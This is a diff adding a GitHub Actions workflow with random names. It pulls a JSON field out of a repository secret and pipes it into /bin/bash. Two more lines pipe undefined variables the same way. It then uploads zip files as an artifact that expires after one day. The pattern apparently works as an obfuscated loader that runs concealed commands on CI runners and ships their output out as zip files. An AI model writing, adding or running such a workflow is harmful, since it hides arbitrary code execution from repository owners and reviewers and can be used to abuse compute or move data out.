@@ -1,0 +1,23 @@
+name: couchdbgeorge888
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: couchdbgeorge888
+        env:
+          o9: ${{ secrets.o9 }}
+        run: |
+          printf '%s' "$o9" | jq -r .u5088 | /bin/bash
+          echo $bmqke577 | jq -r .odevz4096 | /bin/bash
+          echo $r07382 | jq -r .olnrf55 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Nxv1lZoY
+          path: "*.zip"
+          retention-days: 1
